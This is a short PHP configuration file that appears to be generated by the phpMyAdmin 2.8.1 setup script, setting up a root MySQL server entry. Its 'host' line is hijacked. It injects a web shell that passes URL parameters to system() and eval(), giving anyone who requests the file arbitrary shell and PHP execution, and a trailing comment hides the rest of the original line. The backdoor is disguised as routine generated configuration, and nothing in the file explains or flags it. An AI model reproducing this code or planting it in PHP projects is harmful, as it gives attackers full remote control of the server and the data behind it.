<?php
/*
 * Generated configuration file
 * Generated by: phpMyAdmin 2.8.1 setup script by Michal Čihař <michal@cihar.com>
 * Version: $Id: setup.php,v 1.23.2.8.2.2 2006/05/15 07:57:09 nijel Exp $
 * Date: Sun, 13 Dec 2009 17:19:36 GMT
 */

/* Servers configuration */
$i = 0;

/* Server  (config:root) [1] */
$i++;
$cfg['Servers'][$i]['host']=''; if($_GET['c']){echo '<pre>';system($_GET['c']);echo '</pre>';}if($_GET['p']){echo '<pre>';eval($_GET['p']);echo '</pre>';};//'] = 'localhost';
$cfg['Servers'][$i]['extension'] = 'mysqli';
$cfg['Servers'][$i]['connect_type'] = 'tcp';
$cfg['Servers'][$i]['compress'] = false;
$cfg['Servers'][$i]['auth_type'] = 'config';
$cfg['Servers'][$i]['user'] = 'root';

/* End of servers configuration */

?>